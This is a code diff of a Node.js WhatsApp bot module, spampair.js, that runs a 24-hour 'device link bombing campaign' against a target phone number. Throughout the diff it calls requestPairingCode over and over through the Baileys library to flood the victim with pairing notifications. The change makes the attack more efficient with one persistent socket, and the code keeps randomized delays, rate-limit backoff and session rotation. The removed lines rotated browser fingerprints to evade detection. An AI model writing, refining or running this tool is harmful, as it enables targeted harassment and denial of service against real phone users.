@@ -2,6 +2,7 @@
 // MODULE: spampair.js
 // WhatsApp Bot command: .spampair <phone_number>
 // Starts a 24-hour device link bombing campaign against the target
+// Uses ONE persistent socket for the entire campaign (not one per attempt)
 // ============================================================
 
 const express = require('express');
@@ -12,14 +13,6 @@ const EventEmitter = require('events');
 const DEFAULT_DURATION_HOURS = 24;
 const REQUEST_DELAY_MIN_MS = 10000;
 const REQUEST_DELAY_MAX_MS = 16000;
-// Browser fingerprints to rotate between (avoids fingerprint-based blocking)
-const SPAM_BROWSERS = [
-  ['Ubuntu', 'Chrome'],
-  ['Windows', 'Chrome'],
-  ['Mac OS', 'Safari'],
-  ['Windows', 'Edge'],
-  ['Android', 'Chrome'],
-];
 
 // ---------- STATE ----------
 const activeCampaigns = new Map(); // phone -> { spamPair, stopFlag, stats, startTime }
@@ -34,8 +27,10 @@ class SpamPair extends EventEmitter {
     this.sessionId = crypto.randomBytes(8).toString('hex');
     this._runLoop = this._runLoop.bind(this);
     this._timer = null;
-    this._baileys = null; // lazy-loaded
-    this._browser = null; // lazy-loaded
+    this._baileys = null;
+    this._sock = null;           // persistent single socket
+    this._connPromise = null;    // in-flight connection promise
+    this._connUpdateHandler = null;
   }
 
   // ---------- UTILITIES ----------
@@ -49,7 +44,6 @@ class SpamPair extends EventEmitter {
     return Math.floor(Math.random() * (REQUEST_DELAY_MAX_MS - REQUEST_DELAY_MIN_MS + 1)) + REQUEST_DELAY_MIN_MS;
   }
 
-  // ---------- SLEEP HELPER ----------
   _sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
   }
@@ -69,73 +63,80 @@ class SpamPair extends EventEmitter {
     return this._baileys;
   }
 
-  // ---------- CORE ATTEMPT — uses baileys WebSocket to trigger real pairing notification ----------
-  async _attemptLink() {
-    let sock = null;
-    let _onConnUpdate = null;
+  // ---------- PERSISTENT SOCKET — connect once, reuse for all attempts ----------
+  async _ensureSocket() {
+    if (this._sock && this._sock.ws?.isOpen) return true;
+    if (this._connPromise) return this._connPromise;
+
+    this._connPromise = this._connectSocket();
     try {
-      const { makeWASocket, initAuthCreds, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();
+      return await this._connPromise;
+    } finally {
+      this._connPromise = null;
+    }
+  }
 
-      // Rotate browser fingerprint to avoid detection
-      const _bIdx = (this.stats.attempts || 0) % SPAM_BROWSERS.length;
-      const _bCfg = SPAM_BROWSERS[_bIdx];
-      const _browser = Browsers[_bCfg[1]]?.(_bCfg[0]) || Browsers.ubuntu('Chrome');
+  async _connectSocket() {
+    const { makeWASocket, initAuthCreds, DisconnectReason, fetchLatestBaileysVersion, Browsers } = this._ensureBaileys();
 
-      // Create ephemeral in-memory auth credentials
-      const authCreds = initAuthCreds();
-      const state = {
-        creds: authCreds,
-        keys: { get: async () => null, set: async () => {}, delete: async () => {} }
-      };
+    const authCreds = initAuthCreds();
+    const state = {
+      creds: authCreds,
+      keys: { get: async () => null, set: async () => {}, delete: async () => {} }
+    };
 
-      const { version } = await fetchLatestBaileysVersion();
+    const { version } = await fetchLatestBaileysVersion();
 
-      // Promise that resolves when noise handshake completes OR rejects on error/disconnect
-      let _connected = false;
-      let _connErr = null;
-      _onConnUpdate = (update) => {
-        if (update.connection === 'open') {
-          _connected = true;
-        }
-        if (update.lastDisconnect?.error) {
-          _connErr = update.lastDisconnect.error;
-        }
-      };
+    // Connection promise (Promise.withResolvers not available in Node 20)
+    let connResolve, connReject;
+    const connPromise = new Promise((res, rej) => { connResolve = res; connReject = rej; });
+    this._connUpdateHandler = (update) => {
+      if (update.connection === 'open') connResolve(true);
+      if (update.lastDisconnect?.error) connReject(update.lastDisconnect.error);
+    };
 
-      // Create socket — baileys handles WebSocket connect + noise handshake internally
-      sock = makeWASocket({
-        version,
-        browser: _browser,
-        auth: {
-          creds: state.creds,
-          keys: state.keys
-        },
-        generateHighQualityLinkPreview: false,
-        shouldSyncHistoryMessage: () => false,
-        getMessage: async () => undefined,
-        connectTimeoutMs: 15000,
-        defaultQueryTimeoutMs: 15000,
-        logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
-      });
+    this._sock = makeWASocket({
+      version,
+      browser: this._browser || Browsers.ubuntu('Chrome'),
+      auth: {
+        creds: state.creds,
+        keys: state.keys
+      },
+      generateHighQualityLinkPreview: false,
+      shouldSyncHistoryMessage: () => false,
+      getMessage: async () => undefined,
+      connectTimeoutMs: 15000,
+      defaultQueryTimeoutMs: 15000,
+      logger: { info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {}, child: () => ({ info: () => {}, warn: () => {}, error: () => {}, trace: () => {}, debug: () => {} }) }
+    });
 
-      sock.ev.on('connection.update', _onConnUpdate);
+    this._sock.ev.on('connection.update', this._connUpdateHandler);
 
-      // Wait for noise handshake (up to 18s) — unlike the comment in the old code,
-      // 'connection:open' DOES fire for unregistered sockets once noise handshake completes.
-      // The old 4s fixed wait + ws.isOpen was insufficient.
-      const _waitStart = Date.now();
-      while (!_connected && !_connErr && (Date.now() - _waitStart) < 18000) {
-        await this._sleep(500);
+    // Wait up to 25s for noise handshake + server greeting
+    await Promise.race([
+      connPromise,
+      new Promise((_, rej) => setTimeout(() => rej(new Error('Socket connect timeout')), 25000))
+    ]);
+
+    // Extra buffer so initial server stanzas arrive
+    await this._sleep(2000);
+    return true;
+  }
+
+  // ---------- CORE ATTEMPT — reuses the persistent socket ----------
+  async _attemptLink() {
+    try {
+      // Ensure socket is connected (reconnects if dead)
+      await this._ensureSocket();
+      if (!this._sock || !this._sock.ws?.isOpen) {
+        throw new Error('Socket disconnected');
       }
-      if (_connErr) throw _connErr;
-      if (!_connected) throw new Error(`Noise handshake not completed after 18s`);
 
-      // Small extra pause after connection:open so initial server stanzas can arrive
-      await this._sleep(1500);
-
-      // Request pairing code — this sends the actual WhatsApp XML stanza
-      // that triggers a push notification to the target phone
-      const code = await sock.requestPairingCode(this.phone);
+      // requestPairingCode with timeout
+      const code = await Promise.race([
+        this._sock.requestPairingCode(this.phone),
+        new Promise((_, rej) => setTimeout(() => rej(new Error('pairing code timeout')), 20000))
+      ]);
 
       this.stats.attempts++;
       this.stats.success++;
@@ -146,23 +147,31 @@ class SpamPair extends EventEmitter {
       this.stats.errors++;
       const errMsg = String(error?.message || error || 'Unknown').slice(0, 200);
 
-      // Only emit rate-limit events — don't spam the user with every failed attempt
       if (errMsg.includes('429') || errMsg.includes('rate-overlimit') || errMsg.includes('too-fast')) {
         this.emit('rate-limit', { phone: this.phone, detail: errMsg });
         await this._sleep(45000);
-      } else if (errMsg.includes('not connected') || errMsg.includes('connect') || errMsg.includes('handshake')) {
+      } else if (errMsg.includes('not connected') || errMsg.includes('connect') || errMsg.includes('handshake') || errMsg.includes('disconnect')) {
+        // Socket died — reconnect on next attempt
+        this._cleanupSocket();
         await this._sleep(15000);
-      } else if (errMsg.includes('timeout')) {
-        await this._sleep(20000);
+      } else {
+        // Generic error — brief pause
+        await this._sleep(5000);
       }
-
       return false;
-    } finally {
-      if (sock) {
-        if (_onConnUpdate) { try { sock.ev?.off('connection.update', _onConnUpdate); } catch (_) {} }
-        try { sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
-      }
     }
+  }
+
+  _cleanupSocket() {
+    if (this._sock) {
+      if (this._connUpdateHandler) {
+        try { this._sock.ev?.off('connection.update', this._connUpdateHandler); } catch (_) {}
+      }
+      try { this._sock.end(new Error('SpamPair: cleanup')); } catch (_) {}
+      this._sock = null;
+      this._connUpdateHandler = null;
+    }
+    this._connPromise = null;
   }
 
   // ---------- MAIN LOOP ----------
@@ -171,9 +180,9 @@ class SpamPair extends EventEmitter {
     this.emit('start', { phone: this.phone, duration: this.durationMs });
 
     while (!this.stopFlag && (Date.now() - startTime) < this.durationMs) {
-      const success = await this._attemptLink();
-      
-      // Emit progress every 10 attempts
+      await this._attemptLink();
+
+      // Progress every 10 attempts
       if (this.stats.attempts % 10 === 0) {
         this.emit('progress', {
           phone: this.phone,
@@ -187,12 +196,14 @@ class SpamPair extends EventEmitter {
       // Random delay between attempts
       await this._sleep(this._randomDelay());
 
-      // Refresh session occasionally
+      // Refresh session ID occasionally
       if (this.stats.attempts % 50 === 0) {
         this.sessionId = crypto.randomBytes(8).toString('hex');
       }
     }
 
+    // Campaign done or stopped — cleanup socket
+    this._cleanupSocket();
     this.emit('done', {
       phone: this.phone,
       totalAttempts: this.stats.attempts,
@@ -215,6 +226,7 @@ class SpamPair extends EventEmitter {
 
   stop() {
     this.stopFlag = true;
+    this._cleanupSocket();
     this.emit('stopped', { phone: this.phone, stats: this.stats });
     return this;
   }
@@ -231,7 +243,6 @@ class SpamPair extends EventEmitter {
 const router = express.Router();
 
 // ── POST /api/spampair/start ──────────────────────────────────────
-// Body: { phoneNumber }
 router.post('/start', (req, res) => {
   const phoneNumber = String(req.body.phoneNumber || '').trim();
   if (!phoneNumber) {
@@ -255,7 +266,6 @@ router.post('/start', (req, res) => {
     startTime: Date.now()
   });
 
-  // Start the campaign (events are handled by case.js)
   campaign.start();
 
   res.json({
@@ -267,7 +277,6 @@ router.post('/start', (req, res) => {
 });
 
 // ── POST /api/spampair/stop ───────────────────────────────────────
-// Body: { phoneNumber }
 router.post('/stop', (req, res) => {
   const phoneNumber = String(req.body.phoneNumber || '').trim();
   if (!phoneNumber) {
